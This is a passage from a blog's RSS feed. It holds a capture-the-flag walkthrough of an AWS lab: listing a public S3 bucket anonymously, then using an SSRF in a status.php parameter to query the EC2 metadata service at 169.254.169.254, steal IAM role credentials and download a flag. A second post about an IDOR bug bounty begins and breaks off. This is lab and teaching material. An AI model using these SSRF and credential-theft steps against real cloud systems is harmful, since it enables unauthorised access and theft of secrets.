-&lt;p&gt;The &lt;code&gt;huge-logistics-storage&lt;/code&gt; is the name of the bucket. When we look at the S3 bucket, we can see a couple of authentication configurations. &lt;code&gt;AuthenticatedUsers&lt;/code&gt; and &lt;code&gt;Unauthenticated(anonymous)&lt;/code&gt;. For &lt;code&gt;AuthenticatedUsers&lt;/code&gt;, access can be granted for specific IAM users/roles or to all AWS accounts.&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;AuthenticatedUsers Access&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;&amp;lt;b&amp;gt; For specific IAM access&amp;lt;/b&amp;gt; which mean permissions that are granted only to particular IAM users/roles&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&amp;lt;b&amp;gt;For any valid AWS users&amp;lt;/b&amp;gt; If a bucket policy or ACL grants permissions to this group, it means any AWS account with valid credentials can access.&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;blockquote&gt;
-&lt;p&gt;Unauthenticated (Anonymous) Access&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;ol&gt;
-&lt;li&gt;&amp;lt;b&amp;gt;Anyone on the internet&amp;lt;/b&amp;gt; can list or get the objects.&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3&gt;AWS CLI&lt;/h3&gt;
-&lt;p&gt;We can check the by command line below&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# admin_cloud6 is just my own aws account
-aws s3 ls s3://huge-logistics-storage --profile admin_cloud6
-
-An error occurred (AccessDenied) when calling the ListObjectsV2 operation: User: arn:aws:iam::427648302155:user/it-admin is not authorized to perform: s3:ListBucket on resource: &quot;arn:aws:s3:::huge-logistics-storage&quot; because no identity-based policy allows the s3:ListBucket action
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;For the unauthenticated request, we can use &lt;code&gt;--no-sign-request&lt;/code&gt; argument.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;aws s3 ls s3://huge-logistics-storage --recursive --no-sign-request                       
-2023-06-01 05:14:05          0 backup/
-2023-06-01 05:14:47       3717 backup/cc-export2.txt
-2023-06-01 21:38:27         32 backup/flag.txt
-2023-06-01 03:40:47          0 web/
-2023-06-01 03:42:33     114886 web/images/about.jpg
-2023-06-01 03:42:34     271657 web/images/banner.jpg
-2023-06-01 03:42:35      48441 web/images/blog1.jpg
-2023-06-01 03:42:36      32805 web/images/blog2.jpg
-2023-06-01 03:42:36      44570 web/images/blog3.jpg
-2023-06-01 03:42:37      20032 web/images/executive.jpg
-2023-06-01 03:42:37      13368 web/images/manager.jpg
-2023-06-01 03:42:38      18260 web/images/manager1.jpg
-2023-06-01 03:42:38      42216 web/images/signature.jpg
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;There is &lt;code&gt;flag.txt&lt;/code&gt; file in backup folder. We can download it &lt;code&gt;cp&lt;/code&gt; command as follow:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;aws s3 cp s3://huge-logistics-storage/backup/flag.txt . --no-sign-request
-fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;It give an error because we don&apos;t have enough access to download it. If we go back to the webpage, there is an endpoint called &lt;code&gt;status.php&lt;/code&gt; as follow:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;http://app.huge-logistics.com/status/status.php?name=hugelogisticsstatus.com&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;Which check the status of the website.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/images/aws/ssrf3.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h3&gt;Getting AWS Secret&lt;/h3&gt;
-&lt;p&gt;We can check this &lt;code&gt;SSRF&lt;/code&gt; via burp collaborator or localhost &lt;code&gt;127.0.0.1&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/images/aws/ssrf4.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;Or we can check &lt;code&gt;metadata&lt;/code&gt; of ec2 instance on this endpoint : &lt;code&gt;169.254.169.254/latest/meta-data/&lt;/code&gt;
-&lt;img src=&quot;/images/aws/ssrf5.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;To grab the aws id and secret key, we need to check first is there any IAM role configured or not from this endpoint &lt;code&gt;169.254.169.254/latest/meta-data/iam/info&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/images/aws/ssrf6.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;Now we can make a request to fetch &lt;code&gt;MetapwnedS3Access&lt;/code&gt;&apos;s secret with this url: &lt;code&gt;169.254.169.254/latest/meta-data/iam/security-credentials/MetapwnedS3Access&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/images/aws/ssrf7.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;By using this aws secret, we can configure aws credential to interact with &lt;code&gt;awscli&lt;/code&gt; as shown below&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/images/aws/ssrf8.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;And then we can validate with this command. This is similar to &lt;code&gt;whoami&lt;/code&gt; command in linux.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;aws sts get-caller-identity --profile metapwned
-{
-    &quot;UserId&quot;: &quot;AROARQVIRZ4UCHIUOGHDS:i-0199bf97fb9d996f1&quot;,
-    &quot;Account&quot;: &quot;104506445608&quot;,
-    &quot;Arn&quot;: &quot;arn:aws:sts::104506445608:assumed-role/MetapwnedS3Access/i-0199bf97fb9d996f1&quot;
-}
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;blockquote&gt;
-&lt;p&gt;[!TIP]
-If you don&apos;t want to add &lt;code&gt;--profile&lt;/code&gt; argument every time you run a command, you can set it as a defult profile like this&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;pre&gt;&lt;code&gt;export AWS_PROFILE=metapwned
-aws sts get-caller-identity                    
-{
-    &quot;UserId&quot;: &quot;AROARQVIRZ4UCHIUOGHDS:i-0199bf97fb9d996f1&quot;,
-    &quot;Account&quot;: &quot;104506445608&quot;,
-    &quot;Arn&quot;: &quot;arn:aws:sts::104506445608:assumed-role/MetapwnedS3Access/i-0199bf97fb9d996f1&quot;
-}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h3&gt;Compromised S3 Bucket Access&lt;/h3&gt;
-&lt;p&gt;Now that we have IAM role access, let’s try downloading the &lt;code&gt;flag.txt&lt;/code&gt; file again using this profile.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;aws s3 cp s3://huge-logistics-storage/backup/flag.txt .
-download: s3://huge-logistics-storage/backup/flag.txt to ./flag.txt
-
-cat flag.txt 
-282f08a114b4b4f2d345100dXXXXXXXX         
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;This time we were able to download successfully the flag file from the compromised S3 bucket.&lt;/p&gt;
 </content:encoded></item><item><title>How I get 1500$ bounty with IDOR to Account Takeover</title><link>https://k0shane.github.io/posts/bug-bounty/how-i-get-1500-idor-ato/</link><guid isPermaLink="true">https://k0shane.github.io/posts/bug-bounty/how-i-get-1500-idor-ato/</guid><pubDate>Sat, 18 Jun 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Back in 2022, I didn&apos;t have a job yet at that time. So I was just doing full time bug bounty hunting and got a couple of bounties from hackerone and zerocopter. One day I saw a fresh program in &lt;code&gt;zerocopter&lt;/code&gt; by searching with google dorks, I think no one hunt it yet on this program except their internal pentest team.
 There are no other subdomains and only one domain is in scope. So I quickly grab the link and make an account.&lt;/p&gt;
 &lt;p&gt;After creating account, I go to my profile and it look like this.&lt;/p&gt;
